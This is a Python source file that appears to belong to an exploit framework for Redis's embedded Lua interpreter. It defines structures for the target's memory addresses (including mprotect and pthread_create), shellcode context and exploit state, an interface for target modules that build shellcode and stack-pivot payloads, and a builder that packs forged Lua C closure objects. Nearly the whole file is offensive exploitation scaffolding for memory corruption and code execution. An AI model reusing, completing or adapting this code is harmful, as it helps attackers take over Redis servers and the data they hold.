from __future__ import annotations
from dataclasses import dataclass, field
import struct
from typing import Callable, Optional, Protocol, Tuple

@dataclass
class CoreAddrs(object):
    redis_base: int
    luaAlloc: int
    mprotect: int
    pthread_create: int

@dataclass
class ExploitState(object):
    target: TargetInfo
    addrs: CoreAddrs
    megabin_address: int
    shellcode_entry: int
    shellcode_page: int

@dataclass
class ShellcodeContext(object):
    origin: int
    addrs: CoreAddrs
    luastate: int
    body_callback: Callable[[ShellcodeContext], Optional[Tuple[bytes, int]]]

@dataclass
class TargetInfo(object):
    name: str
    redis_version: str
    redis_build_id: str

class ModuleProtocol(Protocol):
    def info(self) -> TargetInfo:
        ...

    def core_addrs(self, luaAlloc: int) -> Optional[CoreAddrs]:
        ...

    def create_shellcode(
        self,
        context: ShellcodeContext,
        shellcode: bytes,
        shellcode_body_address: int) -> Optional[Tuple[bytes, int]]:
        ...

    def build_pivot_payload(self, state: ExploitState) -> Tuple[bytes, bytes]:
        ...

@dataclass
class CClosure(object):
    nupvalues: int = field(default=0)
    p_gclist: int = field(default=0)
    p_env: int = field(default=0)
    p_function: int = field(default=0)

    def build(self, next: int = 0) -> bytes:
        data = b''
        data += struct.pack('<Q', next)
        data += b'\x06'     # tt
        data += b'\x00'     # marked
        data += b'\x01'     # isC
        data += struct.pack('B', self.nupvalues)
        data += b'\x00' * 4 # padding
        data += struct.pack('<QQQ', *[
            self.p_gclist,
            self.p_env,
            self.p_function,
        ])
        # NOTE: Not appending upvalues.
        assert(len(data) == 0x28)
        return data
